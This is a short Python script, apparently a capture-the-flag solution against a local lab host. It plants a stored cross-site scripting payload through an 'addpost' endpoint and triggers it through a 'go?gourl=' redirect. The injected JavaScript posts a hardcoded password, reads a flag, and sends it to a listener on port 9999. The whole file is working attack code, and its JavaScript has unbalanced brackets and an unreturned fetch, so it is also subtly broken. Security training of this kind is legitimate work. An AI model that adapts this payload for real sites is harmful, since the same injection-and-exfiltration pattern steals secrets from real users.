import requests

echo_string = """
<script>
    fetch(`http://lab.localhost/setflag`, {
        method: 'POST',
        body: new URLSearchParams({
            "secretpass": "guessmeseeyoucant"
        })
    })
    .then(resp => {
        fetch(`http://lab.localhost/getflag`)
    })
    .then(resp2 => {
        return resp2.text();
    })
        .then(text => {
            fetch(`http://lab.localhost:9999/hi=${text}`)
        })
    })
</script>
"""
encode_1 = requests.utils.quote(echo_string)

# store the XSS script in server
middle_url = f"http://lab.localhost/addpost?ptext={encode_1}"
encode_2 = requests.utils.quote(middle_url)

final_url = f"http://lab.localhost/go?gourl={encode_2}"

requests.get(final_url)
